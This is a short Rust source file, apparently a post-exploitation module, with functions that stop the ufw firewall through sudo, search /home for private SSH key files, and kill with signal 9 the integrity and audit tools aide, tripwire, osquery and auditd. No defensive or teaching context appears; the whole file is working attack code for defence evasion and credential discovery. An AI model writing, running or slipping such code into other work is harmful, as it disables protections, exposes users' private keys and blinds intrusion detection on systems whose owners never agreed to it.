use std::process::Command;

pub struct LinuxOperations;

impl LinuxOperations {
    #[cfg(target_os = "linux")]
    pub fn disable_firewall() -> Result<(), String> {
        let output = Command::new("sudo")
            .args(&["systemctl", "stop", "ufw"])
            .output();

        match output {
            Ok(result) => {
                if result.status.success() {
                    Ok(())
                } else {
                    Err("Failed to disable firewall".to_string())
                }
            }
            Err(e) => Err(format!("Firewall disable failed: {}", e)),
        }
    }

    #[cfg(target_os = "linux")]
    pub fn enumerate_ssh_keys() -> Result<Vec<String>, String> {
        let output = Command::new("find")
            .args(&["/home", "-name", "id_rsa", "-o", "-name", "id_ed25519"])
            .output();

        match output {
            Ok(result) => {
                let stdout = String::from_utf8_lossy(&result.stdout);
                Ok(stdout.lines().map(|s| s.to_string()).collect())
            }
            Err(e) => Err(format!("SSH key enumeration failed: {}", e)),
        }
    }

    #[cfg(target_os = "linux")]
    pub fn kill_security_processes() -> Result<(), String> {
        let processes = vec!["aide", "tripwire", "osquery", "auditd"];
        
        for process in processes {
            let _ = Command::new("pkill")
                .args(&["-9", process])
                .output();
        }

        Ok(())
    }

    #[cfg(not(target_os = "linux"))]
    pub fn disable_firewall() -> Result<(), String> {
        Err("Firewall disable only available on Linux".to_string())
    }

    #[cfg(not(target_os = "linux"))]
    pub fn enumerate_ssh_keys() -> Result<Vec<String>, String> {
        Err("SSH enumeration only available on Linux".to_string())
    }

    #[cfg(not(target_os = "linux"))]
    pub fn kill_security_processes() -> Result<(), String> {
        Err("Process killing only available on Linux".to_string())
    }
}
